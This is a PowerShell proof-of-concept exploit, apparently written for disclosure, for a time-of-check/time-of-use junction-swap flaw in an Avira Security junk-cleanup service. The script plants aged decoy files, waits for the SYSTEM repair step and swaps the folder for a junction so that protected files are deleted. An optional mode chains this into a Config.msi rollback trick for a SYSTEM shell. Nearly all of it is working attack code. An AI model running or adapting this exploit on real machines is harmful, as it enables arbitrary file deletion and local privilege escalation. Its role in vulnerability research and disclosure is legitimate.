# F3_JunkToctouDeletePoC.ps1
# PoC for F-3: TOCTOU junction-swap on the SYSTEM-resident junk-cleanup delete path.
#
# Vulnerability (static evidence, Avira Security 1.1.116.3442):
#   Service.Plugin.SystemSpeedup.dll
#     - Junk.Backend.JunkResolver::DeleteJunkItem -> IFileSystemBackend::DeleteFile(item.Location)
#       with NO reparse-point validation (Backends.dll::FileSystemBackend::DeleteFile is a bare
#       System.IO.File::Delete; no FileSystemSecurityHelper.IsActualFileName in this flow).
#     - The junk scanner sources include user profile locations (get_AppDataDir /
#       get_LocalAppDataDir / GetTempPath) and skips symlinks only at SCAN time
#       (_skipSymLinks), so the path is trusted from scan time to resolve time:
#       swapping the scanned directory for a junction before "Optimize"/resolve makes
#       the SYSTEM worker delete through the junction (CVE-2026-27750 pattern).
#     - Contrast: Optimizer.Backend.Cleaner::DeleteFileItem DOES validate via
#       FileSystemSecurityHelper::IsActualFileName ("Skipping invalid file for deletion") -
#       that is the 27750 fix; the Junk resolver path was not given the same gate.
#
# Usage (run as the LOW-privilege user):
#   Stage 0 (once, as admin): create the protected canary this PoC proves deletion of:
#       New-Item -ItemType Directory C:\Windows\AviraPoCCanary | Out-Null
#       'ProtectedBySYSTEM' | Set-Content C:\Windows\AviraPoCCanary\proof.txt
#   Stage 1: arm the decoy + watcher:
#       .\F3_JunkToctouDeletePoC.ps1 -DecoyDir "$env:TEMP\AviraJunkPoC" -TargetDir C:\Windows\AviraPoCCanary
#   Stage 2: in the Avira UI -> Performance -> System Speedup junk scan: run Scan,
#           confirm the decoy is listed, then run Optimize/repair.
#   Stage 3: the watcher swaps the decoy for a junction the moment the repair phase
#           starts touching it; the SYSTEM worker then deletes through the junction.
#
# Optional full LPE chain (CVE-2026-27750 method, ZDI's public Config.msi technique):
#   .\F3_JunkToctouDeletePoC.ps1 -DecoyDir ... -ConfigMsiLPE
#   requires ZDI's FolderOrFileDeleteToSystem.exe staged beforehand (see ZDI blog
#   "Abusing Arbitrary File Deletes to Escalate Privilege"). That stage deletes
#   C:\Config.msi as SYSTEM via the junction; MSI rollback then drops HID.DLL
#   (their tooling prepares the payload) -> osk.exe from the secure desktop = SYSTEM.
#
# Notes:
#   - The swap window is between "scan finished, item listed" and "repair clicked";
#     this script polls for the repair phase touching the decoy (open handles /
#     attribute touches) and swaps in milliseconds, but manual mode is available:
#     run with -ManualSwap and press ENTER exactly between scan review and Optimize.

param(
    [Parameter(Mandatory=$true)][string]$DecoyDir,
    [string]$TargetDir = 'C:\Windows\AviraPoCCanary',
    [switch]$ConfigMsiLPE,
    [switch]$ManualSwap,
    [int]$JunkAgeDays = 30,
    [int]$WatchMs = 50
)

$ErrorActionPreference = 'Stop'

function Assert-LowPriv {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    if ((New-Object Security.Principal.WindowsPrincipal($id)).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Warning 'Running elevated - the demo is meaningless as admin. Re-run as a limited user.'
    }
}

function New-Decoy {
    if (Test-Path $DecoyDir) { Remove-Item $DecoyDir -Recurse -Force -ErrorAction SilentlyContinue }
    New-Item -ItemType Directory -Path $DecoyDir | Out-Null
    $old = (Get-Date).AddDays(-$JunkAgeDays)
    for ($i=1; $i -le 5; $i++) {
        $f = Join-Path $DecoyDir "junkfile$i.tmp"
        'junk' | Set-Content $f
        (Get-Item $f).CreationTime = $old
        (Get-Item $f).LastWriteTime = $old
        (Get-Item $f).LastAccessTime = $old
    }
    (Get-Item $DecoyDir).CreationTime = $old
    Write-Host "[+] decoy junk dir aged $JunkAgeDays days: $DecoyDir"
}

function Test-TargetReadable { Test-Path $TargetDir }

function Swap-ToJunction {
    Remove-Item $DecoyDir -Recurse -Force
    if ($ConfigMsiLPE) {
        New-Item -ItemType Junction -Path $DecoyDir -Value 'C:\Config.msi' | Out-Null
        Write-Host "[!] decoy is now a junction to C:\Config.msi (LPE chain stage)"
    } else {
        New-Item -ItemType Junction -Path $DecoyDir -Value $TargetDir | Out-Null
        Write-Host "[+] decoy is now a junction to $TargetDir"
    }
}

function Watch-DecoyAccess {
    Write-Host '[*] watching for the repair phase touching the decoy...'
    Write-Host '    -> UI: run the junk Scan, review results, then click Optimize.'
    $lastAccess = (Get-Item $DecoyDir).LastAccessTime
    while ($true) {
        Start-Sleep -Milliseconds $WatchMs
        $it = Get-Item $DecoyDir -ErrorAction SilentlyContinue
        if (-not $it) { Write-Host '[?] decoy vanished'; return $false }
        if ($it.LastAccessTime -gt $lastAccess -or $ManualSwap) { return $true }
    }
}

Assert-LowPriv
if (-not (Test-Path $TargetDir) -and -not $ConfigMsiLPE) {
    Write-Warning "TargetDir $TargetDir missing (Stage 0 admin setup not done)."
}
if ($ConfigMsiLPE) {
    Write-Warning 'Config.msi LPE mode: make sure ZDI FolderOrFileDeleteToSystem payload prep is done.'
}

New-Decoy
if ($ManualSwap) {
    Write-Host '[*] manual mode: press ENTER right after the scan lists the decoy, before Optimize.'
    Read-Host | Out-Null
    Swap-ToJunction
} else {
    if (Watch-DecoyAccess) { Swap-ToJunction }
}

Write-Host '[*] repair is running as SYSTEM in the service worker...'
Start-Sleep -Seconds 5
if ($ConfigMsiLPE) {
    if (-not (Test-Path 'C:\Config.msi')) {
        Write-Host '[+] C:\Config.msi deleted as SYSTEM via junction - arbitrary folder delete confirmed.'
        Write-Host '    Proceed with the MSI rollback stage (ZDI tooling) for the SYSTEM shell.'
    } else { Write-Host '[-] Config.msi still present - swap window missed, retry with -ManualSwap.' }
} else {
    if (-not (Test-TargetReadable)) {
        Write-Host "[+] $TargetDir was deleted as SYSTEM through the junction - arbitrary folder delete confirmed."
    } else { Write-Host '[-] target still present - swap window missed, retry with -ManualSwap.' }
}
